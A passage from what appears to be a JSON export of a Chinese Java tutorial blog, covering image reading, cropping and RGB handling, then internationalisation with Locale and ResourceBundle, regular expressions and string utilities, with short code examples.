**关键类**\n- 图形：Graph\n    - java.awt 包 \n    -  Java 2D库: Graphics2D, Line2D, Rectangle2D, Ellipse2D,Arc2D\n    - Color, Stroke\n- **图像：Image**\n    - javax.imageio包 \n    - ImageIO, BufferedImage, ImageReader, ImageWriter\n\n### **关键类描述**\nJava原生支持**jpg, png**, bmp, wbmp, gif\n- javax.imageio.ImageIO\n    - 自动封装多种ImageReader和ImageWriter，读写图像文件\n    - read 读取图片 write 写图片\n- java.awt.image.BufferedImage,图像在内存中的表示类\n    - getHeight 获取高度\n    - getWidth 获取宽度\n- 图像文件读写/截取/合并\n\n### 图片读写\n```java\n// ImageIO需要测试图片的类型，加载合适的ImageReader来读取图片，耗时更长\nBufferedImage image = ImageIO.read(new File(\"c:/temp/ecnu.jpg\"));\n\n// 指定用jpg Reader来加载，速度会加快\nIterator<ImageReader> readers = ImageIO.getImageReadersByFormatName(\"jpg\");\nImageReader reader = (ImageReader) readers.next();\nImageInputStream iis = ImageIO.createImageInputStream(new File(\"c:/temp/ecnu.jpg\"));\nreader.setInput(iis, true);\n\n//复制（写）图片\nImageIO.write(image, \"png\", new File(\"c:/temp/ecnu.png\"));\n```\n### 获取基础属性\n```java\nSystem.out.println(\"Height: \" + image.getHeight()); // 高度像素\nSystem.out.println(\"Width: \" + image.getWidth()); // 宽度像素\n```\n### 图像切割\n```java\n// 定义一个矩形 并放入切割参数中\nImageReadParam param = reader.getDefaultReadParam();            \nRectangle rect = new Rectangle(x, y, width, height);            \nparam.setSourceRegion(rect);\n\n//从源文件读取一个矩形大小的图像\nBufferedImage bi = reader.read(0, param);\n```\n### RGB\n```java\n//从第一张图片中读取RGB\nint[] firstRGB = new int[width1*height1];    \nfirstRGB = imageOne.getRGB(0,0,width1,height1,firstRGB,0,width1);\n\n//设置左半部分的RGB 从(0,0) 开始 \nimageNew.setRGB(0,0,width1,height1,firstRGB,0,width1); \n```\n\n### **统计图生成**\n- 统计图\n    - 柱状图/饼图/折线图\n    - Java原生的Graphics 2D可以画，比较繁琐\n    - 基于jFreeChart(www.jfree.org/jfreechart)可以快速实现统计图生成\n        - 设定数据集\n        - 调用ChartFactory生成图形","tags":["Java"],"categories":["Java","Java进阶"]},{"title":"Java 高级文本处理","url":"/reimu-lighthouse/20210921/java-advanced-text-processing/","content":"## **1. 国际化编程**\n* Java是第一个设计成支持国际化的编程语言\n    - java.util.ResourceBundle 用于加载一个语言_国家语言包\n    - java.util.Locale 定义一个语言_国家\n    - java.text.MessageFormat 用于格式化带占位符的字符串\n    - java.text.NumberFormat 用于格式化数字/金额\n    - java.text.DateFormat 用于格式化日期时间\n    - java.time.format.DateTimeFormatter 用于格式化日期时间\n\n### **Locale类**\n- Locale(zh_CN, en_US,…)\n    - 语言，zh，en等 \n    - 国家/地区，CN，US等 \n    - 其他变量(variant)(几乎不用)\n- Locale方法\n    - getAvailableLocales()返回所有的可用Locale\n    - getDefault()返回默认的Locale\n\n### **语言文件**\n-  一个Properties文件 \n    - 包含K-V对，每行一个K-V，例如：age=20\n- 命名规则\n    - 包名_语言_国家地区.properties, (语言和国家地区可选) \n        e.g. message_zh_CN.properties\n    - 存储文件必须是ASCII码文件\n    - 如果是ASCII以外的文字，必须用Unicode的表示\\uxxxx\n    - 可以采用native2ascii.exe (%JAVA_HOME%\\bin目录下)进行转码\n\n### **ResourceBundle类**\n1. **ResourceBundle**\n*  根据Locale要求，加载语言文件(Properties文件)，存储K-V对\n    ```java\n    Locale myLocale = new Locale(\"zh\", \"CN\");\n    ResourceBundle.getBundle(\"msg\", myLocale); //加载msg_zh_CN.properties\n    ```\n* getString(String key) 返回所对应的value\n    * 如果找不到key，则报异常\n2. **语言文件层级结构**\n* 文件: 包名_当前Locale语言_当前Locale国家地区_当前Locale变量(variant)\n    * msg_zh_CN.properties (注意大小写) \n    *  msg_zh.properties\n    *  msg.properties\n* 文件形成树结构\n3. **ResourceBundle 加载文件**\n* 首先，按如下顺序找到第一个Properties文件\n    - 包名_当前Locale语言_当前Locale国家地区_当前Locale变量(variant)\n    - 包名_当前Locale语言_当前Locale国家地区\n    - 包名_当前Locale语言\n    - 包名_默认Locale语言_默认Locale国家地区_默认Locale变量(variant)\n    - 包名_默认Locale语言_默认Locale国家地区\n    - 包名_默认Locale语言\n    - 包名\n* 根据Properties树结构，把第一步的Properties文件及父级文件全部加载，作为后续的K-V集合\n\n## **2. 高级字符串处理**\n### **正则表达式**\n- 用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串” \n- 作用\n    - 测试字符串内的模式\n    - 识别/替换文本\n    - 提取文本\n\n### **java.util.regex包**\n* Pattern类 正则表达式的编译表示\n    - compile 编译一个正则表达式为Pattern对象\n    - matcher 用Pattern对象匹配一个字符串，返回匹配结果\n    ```java\n    private static final String REGEX = \"\\\\bdog\\\\b\";  //\\b表示边界\n    private static final String INPUT = \"dog dog dog doggie dogg\";\n    Pattern p = Pattern.compile(REGEX);\n    Matcher m = p.matcher(INPUT);\n    ```\n* Matcher类\n    - Index Methods(位置方法) \n    - start(), start(int group), end(), end(int group)\n    ```java\n    while (m.find()) {\n        System.out.println(\"start(): \" + m.start()); //开始位置\n        System.out.println(\"end(): \" + m.end()); //结束位置\n    }\n    ```\n    - Study Methods(查找方法)\n    - lookingAt(), find(), find(int start), matches()\n    ```java\n    private static final String REGEX = \"foo\";\n    private static final String INPUT = \"foooooooo\";\n    private static Pattern pattern;\n    private static Matcher matcher;\n\n    public static void main(String[] args) {\n        // Initialize\n        pattern = Pattern.compile(REGEX);\n        matcher = pattern.matcher(INPUT);\n\n        System.out.println(\"Current REGEX is: \" + REGEX);\n        System.out.println(\"Current INPUT is: \" + INPUT);\n\n        System.out.println(\"lookingAt(): \" + matcher.lookingAt());  //部分匹配\n        System.out.println(\"matches(): \" + matcher.matches());    //完全匹配\n    }\n    ```\n    - Replacement Methods(替换方法) \n    - replaceAll(String replacement)\n      - appendReplacement方法：\n        ```java\n        private static String REGEX = \"a*b\"; //*表示限定前面的a可以有0或者多个。\n        private static String INPUT = \"aabfooaabfooabfoobcdd\";\n        private static String REPLACE = \"-\";\n\n        public static void main(String[] args) {\n            Pattern p = Pattern.compile(REGEX);\n            Matcher m = p.matcher(INPUT); // get a matcher object\n            StringBuffer sb = new StringBuffer();\n            //全部替换\n            while(m.find()){\n                m.appendReplacement(sb,REPLACE);\n            }\n            //将最后的尾巴字符串附加上\n            m.appendTail(sb); \n            System.out.println(sb.toString());\n        }\n        ```\n        replaceAll方法：\n        ```java\n        private static String REGEX = \"a*b\"; //*表示限定前面的a可以有0或者多个。\n        private static String INPUT = \"aabfooaabfooabfoobcdd\";\n            private static String REPLACE = \"-\";\n            public static void main(String[] args) {\n                Pattern p = Pattern.compile(REGEX);\n                Matcher m = p.matcher(INPUT); // get a matcher object\n                StringBuffer sb = new StringBuffer();\n                //全部替换\n                while(m.find()){\n                    m.appendReplacement(sb,REPLACE);\n                }\n                //将最后的尾巴字符串附加上\n                m.appendTail(sb); \n                System.out.println(sb.toString());\n            }\n        ```\n\n### **其他字符串操作**\n- 字符串和集合互转\n    - [1,2,3], “1,2,3”\n    ```java\n    import org.apache.commons.lang3.StringUtils;\n\n    List<String> names = new LinkedList<String>();\n    names.add(\"Xiaohong\");\n    names.add(\"Xiaoming\");\n    names.add(\"Daming\");\n    names.add(\"Xiaohei\");\n\n    //从ArrayList变到字符串\n    String str1 = String.join(\",\", names);  //String.join， JDK 8 引入\n    System.out.println(str1);\n    \n    String str2 = StringUtils.join(names, \",\");  //Apache Commons Lang\n    System.out.println(str2);\n        \n    //从字符串变回ArrayList\n    List<String> names2 = Arrays.asList(str2.split(\",\")); \n    for(String name:names2) {\n            System.out.println(name);\n    }\n\n    //StringUtils 可以支持更多数据类型\n    List<Integer> ids = new ArrayList<Integer>();\n    ids.add(1);\n    ids.add(3);\n    ids.add(5);\n    String str3 = StringUtils.join(ids, \",\");  \n    System.out.println(str3);\n    ```\n- 字符串转义\n    - 对关键字符转义\n    ```java\n    import org.apache.commons.text.StringEscapeUtils;\n    String str = \"He didn't say, \\\"Stop!\\\"\";\n\n    //转义\n    String escapedStr = StringEscapeUtils.escapeJava(str);\n    System.out.println(\"escape\" + \":\" + escapedStr);\n\n    //从转义字符串转回来\n    String str2 = StringEscapeUtils.unescapeJava(escapedStr);\n    System.out.println(\"unescape\" + \":\" + str2);\n    ```\n- 变量名字格式化\n    - 名字驼峰命名\n    ```java\n    import com.google.common.base.CaseFormat;\n    String s1 = \"CONSTANT_NAME\";\n    String s2 = CaseFormat.UPPER_UNDERSCORE.to(CaseFormat.LOWER_CAMEL, s1);\n    System.out.println(s2); //constantName;\n    ```\n- 字符串输入流\n    - 将字符串转为一个输入流\n    - 输入流可以定义为Scanner（OJ实现原理）\n    ```java\n    import org.apache.commons.io.Charsets;\n    import org.apache.commons.io.IOUtils;\n    //构造字符串列表\n    List<String> names = new LinkedList<String>();\n    names.add(\"Xiaohong\");\n    names.add(\"Xiaoming\");\n    names.add(\"Daming\");\n    names.add(\"Xiaohei\");\n\n    //合并为一个字符串，以逗号相连\n    String nameStr = String.join(\",\",names);\n\n    //将字符串作为默认的输入流\n    InputStream in = IOUtils.toInputStream(nameStr, Charsets.toCharset(\"UTF-8\"));\n    //重置系统的输入流\n    System.setIn(in);\n\n    //模拟键盘输入  这也是OJ平台测试用例输入的原理\n    //此处也可以换成一个文件输入流\n    Scanner sc=new Scanner(System.in);\n    sc.useDelimiter(\",\");\n    while(sc.hasNext())\n    {\n        System.out.println(sc.next());\n    }\n    ```","tags":["Java"],"categories":["Java","Java进阶"]}]